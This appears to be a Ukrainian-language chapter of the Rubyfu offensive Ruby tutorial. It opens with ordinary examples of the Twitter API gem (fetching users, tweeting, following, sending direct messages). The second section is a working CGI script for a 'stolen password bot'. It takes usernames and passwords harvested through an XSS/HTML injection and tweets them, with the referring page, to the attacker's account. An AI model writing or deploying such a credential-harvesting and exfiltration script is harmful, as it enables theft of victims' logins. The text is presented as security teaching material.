# Twitter API
Вміння працювати з API твіттеру є дійсно корисним для отримання інформації, систематизування її, та задля соціальної взаємодії. Але вам потрібно мати ключі та токени для того, щоб отримати мождивість працювати з API твіттеру. Щоб зробити це, зверніться до офіційної документаціх на [сторінці розробника Twitter][1].

- Щоб встановити Twitter API виконайте:
```
gem install twitter
```

## Використання
**rubyfu-tweet.rb**
```ruby
#!/usr/bin/env ruby
# KING SABRI | @KINGSABRI
#
require 'twitter'
require 'pp'

client = Twitter::REST::Client.new do |config|
        config.consumer_key        = "YOUR_CONSUMER_KEY"
        config.consumer_secret     = "YOUR_CONSUMER_SECRET"
        config.access_token        = "YOUR_ACCESS_TOKEN"
        config.access_token_secret = "YOUR_ACCESS_SECRET"
end

puts client.user("Rubyfu")                   # Fetch a user
puts client.update("@Rubyfu w00t! #Rubyfu")  # Tweet (as the authenticated user)
puts client.follow("Rubyfu")                 # Follow User (as the authenticated user)
puts client.followers("Rubyfu")              # Fetch followers of a user
puts client.followers                        # Fetch followers of current user 
puts client.status(649235138585366528)       # Fetch a particular Tweet by ID
puts client.create_direct_message("Rubyfu", "Hi, I'm KINGSABRI")    # Send direct message to a particular user
```
![](webfu__twitterAPI1.png)


**Ваш хід**, надішліть твіт до @Rubyfu використовуючи вищенаведений приклад. відправте ваш код та результат роботи до **@Rubyfu**.

## Побудова бота, що повідомляє про вкрадені паролі

Уявимо, що ии використовуємо якусь XSS/HTML ін'єкцію для того. щоб змусити користувачів вводити логін та пароль. Ідея в тому, щоб зробити[CGI скрипт][2] який отримує вкрадені паролі й відправляє нам твіт повідомлення про це.

```ruby
#!/usr/bin/ruby -w                                                                 

require 'cgi'
require 'uri'
require 'twitter'

cgi  = CGI.new
puts cgi.header

user = CGI.escape cgi['user']
pass = CGI.escape cgi['pass']
time = Time.now.strftime("%D %T")

client = Twitter::REST::Client.new do |config|
        config.consumer_key        = "YOUR_CONSUMER_KEY"
        config.consumer_secret     = "YOUR_CONSUMER_SECRET"
        config.access_token        = "YOUR_ACCESS_TOKEN"
        config.access_token_secret = "YOUR_ACCESS_SECRET"
end
client.user("KINGSABRI")

if cgi.referer.nil? or cgi.referer.empty?
    # Twitter notification | WARNING! It's tweets, make sure your account is protected!!!
    client.update("[Info] No Referer!\n" + "#{CGI.unescape user}:#{CGI.unescape pass}")
else
    client.update("[Info] #{cgi.referer}\n #{CGI.unescape user}:#{CGI.unescape pass}")
end

puts ""
```






[1]: https://dev.twitter.com/oauth/overview
[2]: http://rubyfu.net/content/module_0x4__web_kung_fu/index.html#cgi
